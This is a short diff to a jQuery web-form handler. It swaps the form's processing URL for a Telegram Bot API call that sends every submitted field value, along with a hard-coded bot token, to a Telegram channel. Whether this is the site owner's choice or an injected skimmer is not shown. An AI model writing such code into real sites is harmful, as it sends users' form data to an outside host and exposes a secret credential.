@@ -32,10 +32,11 @@ $(function()
 					
 					formData[fieldID] = fieldData;		
 				});
-	
+				str_val = Object.values(formData).join()
 				$.ajax({
-		        	url: processorFile,
-		    		type: "POST",
+// 		        	url: processorFile,		    		
+		        	url: "https://api.telegram.org/bot344390018:AAGebJv5mqh4HiVyGBz3ZEUZNemV-FN8Ijc/sendMessage?chat_id=@zakazakanbm&text="+str_val,
+				type: "POST",
 		    		data: formData,
 		    		cache: false,
 		    		success: function(data) // Success
